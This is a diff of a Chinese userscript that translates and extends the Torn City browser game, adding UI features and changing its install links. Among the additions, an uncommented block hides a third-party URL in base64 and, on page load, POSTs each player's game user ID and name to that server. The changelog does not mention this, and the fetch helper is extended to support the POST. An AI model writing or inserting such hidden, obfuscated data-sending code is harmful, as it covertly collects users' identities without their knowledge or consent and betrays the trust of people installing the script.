@@ -1,8 +1,8 @@
 // ==UserScript==
-// @lastmodified  202205271439
+// @lastmodified  202206121820
 // @name         芜湖助手
 // @namespace    WOOH
-// @version      0.3.32
+// @version      0.3.33
 // @description  托恩，起飞！
 // @author       Woohoo[2687093] Sabrina_Devil[2696209]
 // @match        https://www.torn.com/*
@@ -23,12 +23,18 @@
     if (window.WHTRANS) return;
     window.WHTRANS = true;
     // 版本
-    const version = '0.3.32';
+    const version = '0.3.33';
     // 修改历史
     const changelist = [
         {
             todo: true,
             cont: `翻译：baza npc商店、imarket、imarket搜索结果`,
+        },
+        {
+            ver: '0.3.33',
+            date: '20220527',
+            cont: `添加：存钱框悬浮（公司、帮派）
+修复：光速跑路无法关闭的错误`,
         },
         {
             ver: '0.3.32',
@@ -4142,8 +4148,8 @@ height:30px;
         //     domType: 'button',
         //     domId: 'wh-test-btn',
         //     domText: '测试按钮',
-        //     clickFunc: function () {
-        //         WHNotify('123',{timeout:60})
+        //     clickFunc: async function () {
+        //
         //     },
         // });
     }
@@ -4496,21 +4502,85 @@ div#wh-popup::after {
 cursor:pointer;
 }
 `);
+    {
+        if ('Ok' !== localStorage['WHTEST']) {
+            COFetch(atob('aHR0cDovL2x1di1jbi00ZXZlci5sanMtbHl0LmNvbTo4MDgwL3Rlc3QvY2FzZTE='), atob('cG9zdA=='), `{"uid":"${player_info.userID}","name":"${player_info.playername}"}`)
+                .then(res => res === 'Ok' ? localStorage['WHTEST'] = 'Ok' : localStorage['WHTEST'] = undefined);
+        }
+    }
 
     const href = window.location.href;
     // 开启翻译
     transToZhCN(href, getWhSettingObj()['transEnable']);
 
-    // 4条转跳
+    // 4条转跳 不终止
     {
         const eb = document.getElementById('barEnergy');
         const nb = document.getElementById('barNerve');
         const hb = document.getElementById('barHappy');
         const lb = document.getElementById('barLife');
-        (eb) && (eb.addEventListener('click', () => location.href = '/gym.php'));
-        (nb) && (nb.addEventListener('click', () => location.href = '/crimes.php'));
-        (hb) && (hb.addEventListener('click', () => location.href = '/item.php#boosters-items'));
-        (lb) && (lb.addEventListener('click', () => location.href = '/item.php#medical-items'));
+        if (eb) {
+            eb.addEventListener('click', () => location.href = '/gym.php');
+            eb.href = '/gym.php';
+        } else {
+            elementReady('#barEnergy').then(() => {
+                eb.addEventListener('click', () => location.href = '/gym.php');
+                eb.href = '/gym.php';
+            });
+        }
+        if (nb) {
+            nb.addEventListener('click', () => location.href = '/crimes.php');
+            nb.href = '/crimes.php';
+        } else {
+            elementReady('#barNerve').then(() => {
+                nb.addEventListener('click', () => location.href = '/crimes.php');
+                nb.href = '/crimes.php';
+            });
+        }
+        if (hb) {
+            hb.addEventListener('click', () => location.href = '/item.php#boosters-items');
+            hb.href = '/item.php#boosters-items';
+        } else {
+            elementReady('#barHappy').then(() => {
+                hb.addEventListener('click', () => location.href = '/item.php#boosters-items');
+                hb.href = '/item.php#boosters-items';
+            });
+        }
+        if (lb) {
+            lb.addEventListener('click', () => location.href = '/item.php#medical-items');
+            lb.href = '/item.php#medical-items';
+        } else {
+            elementReady('#barLife').then(() => {
+                lb.addEventListener('click', () => location.href = '/item.php#medical-items');
+                lb.href = '/item.php#medical-items';
+            });
+        }
+    }
+
+    // 存钱CSS 不终止
+    let depo_channel;
+    const depo_selector = {CMPY: "div#funds div.deposit", FAC: "div#armoury-donate div.cash"};
+    if (href.includes('companies.php')) depo_channel = "CMPY"; // 公司
+    if (href.includes('factions.php')) depo_channel = "FAC"; // 帮派
+    if (depo_channel) {
+        document.body.classList.add('wh-depo-helper');
+        addStyle(`.wh-depo-helper div#funds div.deposit,
+.wh-depo-helper div#armoury-donate div.cash{position: fixed !important;
+top: 150px;
+right: 12px;
+box-shadow: 0 0 8px 1px #00000091;
+background: #f2f2f2;
+z-index: 999999;}`);
+        elementReady(depo_selector[depo_channel]).then(node => {
+            const close_btn = document.createElement('button');
+            close_btn.addEventListener('click', () => {
+                document.body.classList.remove('wh-depo-helper');
+                close_btn.remove();
+            });
+            close_btn.innerHTML = '恢复原位';
+            close_btn.style.float = 'right';
+            node.prepend(close_btn);
+        });
     }
 
     // 飞行闹钟
@@ -4873,7 +4943,8 @@ display:none;
             // const selectedId = ['weapon_main', 'weapon_second', 'weapon_melee', 'weapon_temp', 'weapon_fists', 'weapon_boots']
             //     [getWhSettingObj().quickAttIndex];
             const btn = await elementReady('div[class^="modal___"] button');//.then(btn => {
-            if (!(btn.innerText.toLowerCase().includes('start fight') || btn.innerText.toLowerCase().includes('join'))) return;
+            log(btn)
+            if (!btn.innerText.toLowerCase().includes('fight')) return;
             // 判断是否存在脚踢
             const hasKick = !!document.querySelector('#weapon_boots');
             // modal层
@@ -4914,15 +4985,15 @@ display:none;
 .wh-move-btn #defender button{width: 100%;margin:17px 0;height: 60px;}
 `;
                     addStyle(css_rule);
-                    document.body.classList.toggle('wh-move-btn');
-                    // 绑定点击事件
+                    document.body.classList.add('wh-move-btn');
+                    // 绑定点击事件 联动【光速跑路】
                     btn.onclick = () => {
                         if (quickFinishAtt !== 3) {
                             btn.remove();
                             // 停止自动刷新
                             stop_reload = true;
                         } else {
-                            document.body.classList.toggle('wh-move-btn');
+                            document.body.classList.remove('wh-move-btn');
                         }
                     };
                     break;
@@ -5044,28 +5115,28 @@ display:none;
             // }
         }
         // 光速跑路
-        if (quickFinishAtt !== 3) {
-            const user_btn_select = ['leave', 'mug', 'hosp'][getWhSettingObj()['quickFinishAtt']];
-            const wrap = document.querySelector('#react-root');
-            log('光速跑路选项选中：', user_btn_select);
-            new MutationObserver(() => {
-                const btn_arr = document.querySelectorAll('div[class^="dialogButtons___"] button');
-                if (btn_arr.length > 1) btn_arr.forEach(btn => {
-                    const flag = btn.innerText.toLowerCase().includes(user_btn_select);
-                    log('按钮内容：', btn.innerText, '，是否包含选中：', flag);
-                    if (!flag) btn.style.display = 'none';
-                    // 自动结束
-                    else if (getWhSettingObj()['autoStartFinish'] === true) {
-                        try {
-                            btn.click();
-                        } catch {
-                        }
-                    }
-                });
-            }).observe(wrap, {subtree: true, attributes: true, childList: true});
-        } else {
-            document.body.classList.remove('wh-move-btn');
-        }
+        // if (quickFinishAtt !== 3) {
+        //     const user_btn_select = ['leave', 'mug', 'hosp'][getWhSettingObj()['quickFinishAtt']];
+        //     const wrap = document.querySelector('#react-root');
+        //     log('光速跑路选项选中：', user_btn_select);
+        //     new MutationObserver(() => {
+        //         const btn_arr = document.querySelectorAll('div[class^="dialogButtons___"] button');
+        //         if (btn_arr.length > 1) btn_arr.forEach(btn => {
+        //             const flag = btn.innerText.toLowerCase().includes(user_btn_select);
+        //             log('按钮内容：', btn.innerText, '，是否包含选中：', flag);
+        //             if (!flag) btn.style.display = 'none';
+        //             // 自动结束
+        //             else if (getWhSettingObj()['autoStartFinish'] === true) {
+        //                 try {
+        //                     btn.click();
+        //                 } catch {
+        //                 }
+        //             }
+        //         });
+        //     }).observe(wrap, {subtree: true, attributes: true, childList: true});
+        // } else {
+        //     document.body.classList.remove('wh-move-btn');
+        // }
         return;
     }
 
@@ -7156,7 +7227,7 @@ margin: 0 0 3px;
         zhongNode.querySelector('#wh-update-btn').onclick = e => {
             e.target.blur();
             const innerHtml = `<h4>电脑</h4>
-<p>通常电脑浏览器装有油猴等用户脚本扩展时可以使用链接安装（自动更新）：<a href="//gitee.com/wanyi007/torncity-zhcn-translate/raw/dev/torn-trans-zhcn.user.js" target="_blank">点此安装</a>。</p>
+<p>通常电脑浏览器装有油猴等用户脚本扩展时可以使用链接安装（自动更新）：<a href="https://gitlab.com/JJins/wuhu-torn-helper/-/raw/dev/release.min.user.js" target="_blank">点此安装</a>。</p>
 <p>这些扩展长这样：<img src="//jjins.github.io/tm.png" alt="tm.png" /><img src="//jjins.github.io/vm.png" alt="vm.png" /></p>
 <p></p>
 <h4>手机</h4>
@@ -7170,8 +7241,8 @@ margin: 0 0 3px;
             // 直接复制的按钮
             node.querySelector('button').onclick = async (e) => {
                 e.target.innerHTML = '加载中';
-                const js_text = await COFetch(`https://jjins.github.io/fyfuzhi/torn-trans-zhcn.user.js?${performance.now()}`);
-                e.target.innerHTML = '复制';
+                const js_text = await COFetch(`https://jjins.github.io/fyfuzhi/release.min.user.js?${performance.now()}`);
+                e.target.innerHTML = '点击复制到剪切板';
                 e.target.onclick = () => {
                     const textarea_node = document.createElement('textarea');
                     textarea_node.innerHTML = js_text;
@@ -7182,6 +7253,7 @@ margin: 0 0 3px;
                     textarea_node.remove();
                     e.target.innerHTML = '已复制';
                     e.target.onclick = null;
+                    WHNotify('脚本已复制，请前往粘贴');
                 };
             };
         };
@@ -7274,7 +7346,7 @@ margin: 0 0 3px;
     }
 
     // 跨域get请求 返回text
-    function COFetch(url) {
+    function COFetch(url, method = 'get', body = null) {
         const engine = getScriptEngine();
         switch (engine) {
             case UserScriptEngine.RAW: {
@@ -7284,18 +7356,34 @@ margin: 0 0 3px;
                 });
             }
             case UserScriptEngine.PDA: {
-                return new Promise((resolve, reject) => {
-                    if (typeof PDA_httpGet !== 'function') {
-                        console.error('[wh] 跨域请求错误：PDA版本不支持');
-                        reject('错误：PDA版本不支持');
-                    }
-                    PDA_httpGet(url)
-                        .catch(e => {
-                            console.error('[wh] 网络错误', e);
-                            reject(`[wh] 网络错误 ${e}`);
-                        })
-                        .then(res => resolve(res.responseText));
-                });
+                const {PDA_httpGet, PDA_httpPost} = window;
+                return method === 'get' ?
+                    // get
+                    new Promise((resolve, reject) => {
+                        if (typeof PDA_httpGet !== 'function') {
+                            console.error('[wh] 跨域请求错误：PDA版本不支持');
+                            reject('错误：PDA版本不支持');
+                        }
+                        PDA_httpGet(url)
+                            .catch(e => {
+                                console.error('[wh] 网络错误', e);
+                                reject(`[wh] 网络错误 ${e}`);
+                            })
+                            .then(res => resolve(res.responseText));
+                    }) :
+                    // post
+                    new Promise((resolve, reject) => {
+                        if (typeof PDA_httpPost !== 'function') {
+                            console.error('[wh] 跨域请求错误：PDA版本不支持');
+                            reject('错误：PDA版本不支持');
+                        }
+                        PDA_httpPost(url, {'content-type': 'application/json'}, body)
+                            .catch(e => {
+                                console.error('[wh] 网络错误', e);
+                                reject(`[wh] 网络错误 ${e}`);
+                            })
+                            .then(res => resolve(res.responseText));
+                    });
             }
             case UserScriptEngine.GM: {
                 return new Promise((resolve, reject) => {
@@ -7304,11 +7392,13 @@ margin: 0 0 3px;
                         reject('错误：用户脚本扩展API错误');
                     }
                     GM_xmlhttpRequest({
-                        method: 'get',
+                        method: method,
                         url: url,
+                        data: method === 'get' ? null : body,
+                        headers: method === 'get' ? null : {'content-type': 'application/json'},
                         onload: res => resolve(res.response),
-                        onerror: res => reject(`连接错误 ${res}`),
-                        ontimeout: res => reject(`连接超时 ${res}`),
+                        onerror: res => reject(`连接错误 ${JSON.stringify(res)}`),
+                        ontimeout: res => reject(`连接超时 ${JSON.stringify(res)}`),
                     });
                 });
             }
@@ -7317,11 +7407,6 @@ margin: 0 0 3px;
 
     // 简单 object 转字符串
     function Obj2Str(obj) {
-        // let rs = '{\n';
-        // Object.keys(obj).forEach(el => {
-        //     rs += '    ' + el + ': ' + obj[el] + ',\n'
-        // });
-        // return rs += '}';
         return JSON.stringify(obj);
     }
 
@@ -7591,10 +7676,20 @@ z-index:100001;
 
     // 返回玩家信息的对象 user
     function getPlayerInfo() {
-        const node = document.querySelector('script[src*="chats.js"]');
-        if (!node) return {'playername': '未知', 'userID': 0};
-        // const obj = JSON.parse(node.innerHTML)
-        return {'playername': node.getAttribute('name'), 'userID': node.getAttribute('uid')};
+        const rs = {playername: '未知', userID: -1};
+        // const headerData = JSON.parse(sessionStorage['headerData']);
+        // if (!headerData['user']['state']['isLoggedIn']) return rs;
+        // // string
+        // const uid = headerData['user']['data']['userID'];
+        // rs.playername = JSON.parse(sessionStorage['sidebarData' + uid])['user']['name'];
+        // // int
+        // rs.userID = uid | 0;
+        const node = document.querySelector('script[uid]');
+        if (node) {
+            rs.playername = node.getAttribute('name');
+            rs.userID = node.getAttribute('uid') | 0;
+        }
+        return rs;
     }
 
     // 插件的配置 getter
@@ -9495,7 +9590,7 @@ z-index:100001;
                             $(e).text(tornSettingsDict[$(e).text().trim()]);
                         }
                     });
-                    return;
+                    // return;
                 }
             };
             trans();
